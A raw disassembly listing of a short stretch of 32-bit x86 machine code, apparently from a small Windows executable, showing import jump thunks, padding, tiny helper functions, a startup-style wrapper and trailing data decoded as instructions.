  406eb8:	ff 25 8c a2 40 00    	jmp    *0x40a28c
  406ebe:	90                   	nop
  406ebf:	90                   	nop
  406ec0:	ff 25 88 a2 40 00    	jmp    *0x40a288
  406ec6:	90                   	nop
  406ec7:	90                   	nop
  406ec8:	ff 25 84 a2 40 00    	jmp    *0x40a284
  406ece:	90                   	nop
  406ecf:	90                   	nop
  406ed0:	ff 25 78 a2 40 00    	jmp    *0x40a278
  406ed6:	90                   	nop
  406ed7:	90                   	nop
  406ed8:	66 90                	xchg   %ax,%ax
  406eda:	66 90                	xchg   %ax,%ax
  406edc:	66 90                	xchg   %ax,%ax
  406ede:	66 90                	xchg   %ax,%ax
  406ee0:	8b 44 24 04          	mov    0x4(%esp),%eax
  406ee4:	c1 e0 05             	shl    $0x5,%eax
  406ee7:	03 05 a4 a2 40 00    	add    0x40a2a4,%eax
  406eed:	c3                   	ret
  406eee:	90                   	nop
  406eef:	90                   	nop
  406ef0:	a1 d4 93 40 00       	mov    0x4093d4,%eax
  406ef5:	c3                   	ret
  406ef6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406efd:	8d 76 00             	lea    0x0(%esi),%esi
  406f00:	8b 44 24 04          	mov    0x4(%esp),%eax
  406f04:	87 05 d4 93 40 00    	xchg   %eax,0x4093d4
  406f0a:	c3                   	ret
  406f0b:	90                   	nop
  406f0c:	90                   	nop
  406f0d:	90                   	nop
  406f0e:	90                   	nop
  406f0f:	90                   	nop
  406f10:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  406f14:	83 e4 f0             	and    $0xfffffff0,%esp
  406f17:	ff 71 fc             	push   -0x4(%ecx)
  406f1a:	55                   	push   %ebp
  406f1b:	89 e5                	mov    %esp,%ebp
  406f1d:	51                   	push   %ecx
  406f1e:	83 ec 14             	sub    $0x14,%esp
  406f21:	e8 3a ed ff ff       	call   0x405c60
  406f26:	a1 00 70 40 00       	mov    0x407000,%eax
  406f2b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  406f32:	00 
  406f33:	89 44 24 0c          	mov    %eax,0xc(%esp)
  406f37:	a1 d8 93 40 00       	mov    0x4093d8,%eax
  406f3c:	89 44 24 08          	mov    %eax,0x8(%esp)
  406f40:	a1 dc 93 40 00       	mov    0x4093dc,%eax
  406f45:	89 04 24             	mov    %eax,(%esp)
  406f48:	e8 8d e4 ff ff       	call   0x4053da
  406f4d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406f50:	83 ec 10             	sub    $0x10,%esp
  406f53:	c9                   	leave
  406f54:	8d 61 fc             	lea    -0x4(%ecx),%esp
  406f57:	c3                   	ret
  406f58:	90                   	nop
  406f59:	90                   	nop
  406f5a:	90                   	nop
  406f5b:	90                   	nop
  406f5c:	90                   	nop
  406f5d:	90                   	nop
  406f5e:	90                   	nop
  406f5f:	90                   	nop
  406f60:	e9 9b a5 ff ff       	jmp    0x401500
  406f65:	90                   	nop
  406f66:	90                   	nop
  406f67:	90                   	nop
  406f68:	90                   	nop
  406f69:	90                   	nop
  406f6a:	90                   	nop
  406f6b:	90                   	nop
  406f6c:	90                   	nop
  406f6d:	90                   	nop
  406f6e:	90                   	nop
  406f6f:	90                   	nop
  406f70:	ff                   	(bad)
  406f71:	ff                   	(bad)
  406f72:	ff                   	(bad)
  406f73:	ff 60 6f             	jmp    *0x6f(%eax)
  406f76:	40                   	inc    %eax
  406f77:	00 00                	add    %al,(%eax)
  406f79:	00 00                	add    %al,(%eax)
  406f7b:	00 ff                	add    %bh,%bh
  406f7d:	ff                   	(bad)
  406f7e:	ff                   	(bad)
  406f7f:	ff 00                	incl   (%eax)
  406f81:	00 00                	add    %al,(%eax)
	...
